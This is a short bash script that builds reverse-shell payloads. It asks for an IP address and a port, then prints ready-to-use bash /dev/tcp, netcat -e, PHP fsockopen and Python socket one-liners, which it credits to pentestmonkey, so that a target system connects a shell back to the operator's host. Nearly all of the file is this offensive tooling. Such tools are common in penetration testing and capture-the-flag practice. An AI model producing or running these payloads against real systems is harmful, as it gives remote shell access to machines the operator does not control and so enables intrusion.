#!/bin/bash

# Author: Tky

#Reverse shells from pentestmonkey.net

#If you want to use it anywhere on the system, create a soft link.
#ln -s /PATH-TO-FOLDER/makeRS.sh /usr/local/bin/

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n${YELLOW}Exiting...${RESET}"
	rm /tmp/ips
	exit 0
}

RED='\033[0;31m'
YELLOW='\033[1;33m'
RESET='\033[0m'


#Interfaces
interfaces(){
	ips= $(ip addr show | grep "inet\b" | awk '{print $2}' | cut -d/ -f1 > /tmp/ips);
	
	for ips in $(cat /tmp/ips); do
		
		echo "*" $ips
		
	done
}

#ReverseShells
bashRS(){
	echo "bash -i >& /dev/tcp/"$ipRS"/"$portRS "0>&1"
}

phpRS(){
	
	echo "php -r '"\$"sock=fsockopen(\""$ipRS"\",$portRS);exec("\"/bin/sh -i "<""&"3 ">""&""3" "2>""&""3"""\"");'"
}

ncRS(){
	echo "nc -e /bin/sh" $ipRS $portRS
}

pyRS(){
	echo  "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"'$ipRS'"'",$portRS));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["\""/bin/sh"\"","\""-i"\""]);'"
}


#Main

#Banner
echo -e "${RED} ------------------------${RESET}"
echo -e "${RED}|${YELLOW}CREATING A REVERSE SHELL${RED}| ${RESET}"
echo -e "${RED} ------------------------${RESET}"

interfaces
printf "\nEnter your IP: "
read ipRS
printf "Enter your PORT: "
read portRS
printf "What Reverse Shell do you want?\n1-bash\n2-netcat\n3-php\n4-python\n"
read typeRS
clear

case $typeRS in 
	1)
		bashRS
	;;
	2)
		ncRS
	;;
	3)
		phpRS
	;;
	4) 	pyRS
	;;
	*)
		echo "expecting a number..."
	;;
esac
rm /tmp/ips
